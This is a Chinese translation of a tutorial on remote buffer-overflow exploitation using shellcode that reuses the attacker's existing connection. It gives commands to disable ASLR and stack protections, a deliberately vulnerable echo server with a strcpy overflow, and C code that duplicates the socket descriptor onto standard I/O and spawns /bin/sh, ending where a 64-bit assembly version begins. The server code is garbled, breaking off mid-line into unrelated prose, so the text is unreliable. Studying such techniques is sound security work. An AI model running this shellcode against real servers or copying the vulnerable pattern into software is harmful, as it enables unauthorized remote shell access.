# 【技术分享】远程漏洞利用：无需借助套接字的Shellcode
|
##### 译文声明
本文是翻译文章，文章来源：0x00sec.org
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**翻译：**[ **shan66**
****](http://bobao.360.cn/member/contribute?uid=2522399780)
**预估稿费：200RMB（不服你也来投稿啊！）**
******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:PI:EMAIL) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******
**  
**
**前言**
在本文中，我将介绍一种优雅的技术，来获得一个shell访问易受攻击的远程机器。虽然这个技术不是我发明的，但我发现它的确很有趣，所以本文的重点是这种技术本身，而不是利用漏洞的具体方式。
**设置环境**
为了专注于远程shell代码本身，而不是把精力用在如何规避ASLR、非可执行堆栈等防御措施上面，我们将禁用这些安全功能。一旦熟悉了获取shellcode的方法，可以重新启用这些保护措施，以进一步练习如何突破这些安全设置。因此，这是一个非常有趣的练习，如果你想练手的话。
首先，我们将禁用ASLR。为此，可以使用以下命令：
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
这些设置都是临时性质的，在下次重新启动时会全部还原。如果你想要在不重新启动机器的情况下立即还原所有设置的话，可以使用如下所示的命令：
    echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
为了禁用其余的安全功能，我们可以使用以下选项来编译带有安全漏洞的服务器：
    -fno-stack-protector -z execstack
这些选项会禁用堆栈的canarie保护，并赋予堆栈执行权限。这样的话，我们就得到了一个非常容易利用的环境。
**带有安全漏洞的服务**
现在，让我们编写一个带有缓冲区溢出漏洞的小型回显服务器，这样我们就可以远程利用它了。这个程序很简单，你能发现代码中的缓冲区溢出漏洞吗？ 你当然可以。
    #include 
    #include 
    #include 
    #include 
    #include 
    int
    process_request (int s1, char *reply)
    {
      char result[256];
      strcpy (result, reply);
      write (s1, result, strlen(result));
      printf ("Result: %pn", &result);
      return 0;
    }
    int
    main (int argc, char *argv[])
    {
      struct sockaddr_in   server, client;
      socklen_t            len = sizeof (struct sockaddr_in);
      int                  s,s1, ops = 1;
      char                 reply[1024];
      server.sin_addr.s_addr = INADDR_ANY;
      server.sin_family = AF_INET;
      server.sin_port = htons(9000);
      s = socket (PF_INET, SOCK_STREAM, 0);
      if ((setsockopt (s, SOL_SOCKET, SO_REUSEADDR, &ops, sizeof(ops))) 。
看到这两个定义后，你可能会联想到RHOST/RPORT之类的变量….是的，它们可以用来告诉payload连接的主机地址和相应的端口。对于反向shell来说，您必须将这些信息存放到payload中，以便连接回来。对于直接shell你通常需要定义端口，服务器就会等待连接。
但是，至少对于Unix机器来说，还有第三种选择。
**连接复用**
当执行远程漏洞利用代码时，为了利用此漏洞，您已经连接到了服务器…所以，为什么不重用这个已经建立好的连接呢？这真是一个不错的想法，因为它不会显示任何会引起受害者怀疑的东西，例如来自服务器未知服务的开放端口等。
实现这一点的方法也非常巧妙。它是基于这样的事实，即系统是按顺序分配文件描述符的。知道了这一点，我们就可以在建立连接之后立即复制一个当前文件的描述符，除非服务器的负载很重，否则我们得到的文件描述符等于用于我们连接的套接字的文件描述符+1，这样很容易就能知道我们的连接的文件描述符了。
一旦知道了当前连接的文件描述符，我们只需要将它复制到文件描述符0、1和2（stdin、stdout和stderr），就可以生成一个shell了。这样一来，该shell的所有输入/输出都会被重定向到我们的套接字了。
还不明白吗？肯定没读过页面上的文章吧？不过没关系，现在去看也不晚。
相应的C代码如下所示：
    int sck = dup (0) - 1; // Duplicate stdin
    dup2 (sck, 0);
    dup2 (sck, 1);
    dup2  (sck, 2);
    execv ("/bin/sh", NULL);
看…根本就没有使用套接字代码！如果我们把它变成一个shellcode，并且设法利用远程服务器的漏洞来运行该代码，我们就能够获得一个shell来访问远程机器，而这个shell所使用的连接，正好就是原来向远程服务器投递利用代码的那个连接。
当然，也你已经注意到这种技术存在一些缺点。就像我们所提到的那样，如果服务器比较繁忙的话（同时建立许多连接），这种方法就很难奏效了。此外，正常的服务器会在变成守护进程之前关闭所有的文件描述符，因此我们可能需要尝试使用其他值来推测文件描述符。
这个技术是前一段时间跟@_py进行讨论的时候，由他想出来的。我们当时检查的原始代码可以在这里找到：
    http://shell-storm.org/shellcode/files/shellcode-881.php4
但是，这是一个32位代码，所以我重新制作了对应的64位版本，以及一个运行漏洞利用代码的Perl脚本。
**64位版本的Shellcode**
下面的代码您就将就着看吧(我这才发现自己的汇编技能真是生锈了)，不过它确实可以正常运行，并且只比原来的32bits版本长了3个字节。我的64位版本的Shellcode如下所示：
    section .text
    global _start
    _start: